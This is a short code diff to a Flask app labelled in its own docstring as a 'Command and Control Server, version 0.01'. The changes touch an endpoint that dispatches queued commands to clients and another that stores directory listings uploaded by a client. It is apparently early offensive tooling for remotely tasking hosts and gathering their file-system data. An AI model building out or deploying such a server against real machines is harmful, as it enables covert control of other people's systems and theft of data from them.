@@ -1,3 +1,7 @@
+"""
+Command and Control Server
+version 0.01
+"""
 import os
 
 from flask import Flask, escape, request
@@ -25,8 +29,8 @@ def hello():
 
 @app.route('/get_commands')
 def get_commands():
-    cc = CommandController()
-    a = cc.get_collection()
+    cc = CommandController(db)
+    a = cc.dispatch_commands()
     return json.dumps(a)
 
 
@@ -46,7 +50,8 @@ def dir_list():
         data = request.values.get('DirList')
         print(path)
         print(data)
-        db.insert({'command': 'DirList', 'client_id': 777, 'path': path, 'data': data, 'time': time.time()})
+        dir_lists = db.table('dir_lists')
+        dir_lists.insert({'command': 'DirList', 'client_id': 777, 'path': path, 'data': data, 'time': time.time()})
         return json.dumps({"message": 'dirlist saved successfully'})
 
 
